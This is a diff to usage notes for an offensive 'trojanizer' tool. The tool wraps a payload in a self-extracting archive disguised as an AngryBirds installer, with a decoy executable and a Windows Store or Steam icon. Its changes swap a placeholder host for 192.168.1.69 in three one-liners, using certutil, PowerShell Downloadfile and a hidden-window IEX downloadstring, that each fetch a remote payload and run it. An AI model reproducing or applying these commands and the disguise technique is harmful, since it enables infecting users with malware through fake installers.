@@ -112,7 +112,7 @@
     4º - running trojanizer tool
          PAYLOAD TO BE COMPRESSED => <path-to>/screenshot.png (it will not matter what you compress)
          EXECUTE THIS FILE UPON EXTRACTION => <path-to>/AngryBirds.exe (to be executed as decoy application)
-         PRESETUP SANDBOX => cmd.exe /c certutil -urlcache -split -f 'http://webserver/payload.exe', '%TEMP%\\payload.exe'; Start-Process '%TEMP%\\payload.exe'
+         PRESETUP SANDBOX => cmd.exe /c certutil -urlcache -split -f 'http://192.168.1.69/payload.exe', '%TEMP%\\payload.exe'; Start-Process '%TEMP%\\payload.exe'
          SFX FILENAME => AngryBirds_installer (the name of the sfx archive to be created)
          REPLACE ICON => Windows-Store.ico OR Steam-logo.ico
 
@@ -127,10 +127,10 @@
 
 
     The follow oneliner uses 'powershell(Downloadfile+start)' method to achieve the same as previous 'certutil' exercise ..
-    cmd.exe /c powershell.exe -w hidden -c (new-object System.Net.WebClient).Downloadfile('http://webserver/payload.exe', '%TEMP%\\payload.exe') & start '%TEMP%\\payload.exe'
+    cmd.exe /c powershell.exe -w hidden -c (new-object System.Net.WebClient).Downloadfile('http://192.168.1.69/payload.exe', '%TEMP%\\payload.exe') & start '%TEMP%\\payload.exe'
 
     The follow oneliner uses 'powershell(IEX+downloadstring)' method to achieve allmost the same (payload.ps1 does not touch disk)
-    cmd.exe /c powershell.exe -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://webserver/payload.ps1'))"
+    cmd.exe /c powershell.exe -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.69/payload.ps1'))"
     
 
 <br /><br /><br />
